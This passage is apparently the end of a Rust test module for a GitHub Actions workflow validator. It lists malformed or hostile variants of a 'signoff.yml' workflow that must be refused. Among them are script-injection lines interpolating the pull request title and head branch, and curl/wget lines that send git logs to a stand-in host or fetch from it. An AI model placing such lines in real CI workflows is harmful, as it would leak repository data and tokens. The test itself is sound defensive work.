        assert_eq!(refusals("signoff.yml", &good), Vec::<String>::new());
        let planted_forms = [
            base(&format!("{checkout}      - uses: actions/setup-node@0123456789abcdef0123456789abcdef01234567\n{run}")),
            base(&format!("{checkout}{run}{run}")),
            base(run),
            base(&format!("      - uses: actions/checkout@v4\n{run}")),
            base(&format!("      - uses: actions/checkout@11d5960a\n{run}")),
            base(&format!("      - uses: evil/checkout@11d5960a326750d5838078e36cf38b85af677262\n{run}")),
            base(&format!("{checkout}          token: x\n{run}")),
            base(&format!("{checkout}      - run: echo ${{{{ secrets.X }}}}\n")),
            base(&format!("{checkout}      - run: echo ${{{{ github.token }}}}\n")),
            base(&format!("{checkout}      - run: echo hi\n        env:\n          A: b\n")),
            base(&format!("{checkout}      - uses: {pin}\n")),
            format!("{good}  second:\n    runs-on: ubuntu-24.04\n    steps:\n{checkout}{run}"),
            good.replace("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04\n    permissions:\n      contents: write\n"),
            good.replace("    runs-on: ubuntu-24.04\n", "    runs-on: ubuntu-24.04\n    timeout-minutes: 5\n"),
            good.replace("name: signoff\n", "name: signoff\nenv:\n  A: b\n"),
            good.replace("name: signoff\n", "name: signoff\npermissions:\n  contents: write\n"),
            good.replace("  pull_request:\n", "  pull_request:\n    branches: [main]\n"),
            good.replace("  pull_request:\n", "  pull_request:\n  push:\n    tags: [v*]\n"),
            good.replace("  pull_request:\n", "  pull_request_target:\n"),
            // The checkout keeps credentials: said so, or not said.
            good.replace("          persist-credentials: false\n", ""),
            good.replace("persist-credentials: false", "persist-credentials: true"),
            base(&format!("      - uses: {pin}\n{run}")),
            // What reaches the script from the event, and what the script names.
            base(&format!("{checkout}      - run: echo \"${{{{ github.event.pull_request.title }}}}\"\n")),
            base(&format!("{checkout}      - run: echo ${{{{github.head_ref}}}}\n")),
            base(&format!("{checkout}      - run: echo ${{{{ github.event.pull_request.base.sha\n")),
            base(&format!("{checkout}      - run: wget -q https://example.invalid/x\n")),
            base(&format!("{checkout}      - run: x=$(gh pr view)\n")),
            base(&format!("{checkout}      - run: git  push origin HEAD:main\n")),
            base(&format!("{checkout}      - run: git log -1;curl -d x https://example.invalid\n")),
            // The reviewer's two planted forms, 2026-10-22, each on the file this repository carries:
            // `inject` interpolates the title and the head branch's name into the script;
            // `env` sends the log with curl and reads an input the event can carry.
            SIGNOFF_TEXT.replace(
                "          base=\"${{ github.event.pull_request.base.sha }}\"\n",
                "          title=\"${{ github.event.pull_request.title }}\"; ref=\"${{ github.event.pull_request.head.ref }}\"; echo \"$title $ref\"; base=$(git merge-base origin/main HEAD)\n",
            ),
            SIGNOFF_TEXT.replace(
                "          bad=0\n",
                "          bad=0; curl -sS https://example.invalid/collect -d \"$(git log -5)\"; GH_TOKEN=\"${{ github.event.inputs.t }}\"\n",
            ),
        ];
        assert_ne!(planted_forms[planted_forms.len() - 1], SIGNOFF_TEXT, "the env form was not planted");
        assert_ne!(planted_forms[planted_forms.len() - 2], SIGNOFF_TEXT, "the inject form was not planted");
        for text in planted_forms {
            let got = refusals("signoff.yml", &text);
            assert!(!got.is_empty(), "admitted, and should not be:\n{text}");
            assert!(
                got.iter().all(|r| r.contains("signoff.yml") || r.starts_with("`on.") || r.starts_with("`on`") || r.contains("is not a job key")),
                "a refusal that does not say why:\n{text}\n{got:?}"
            );
        }
    }
}
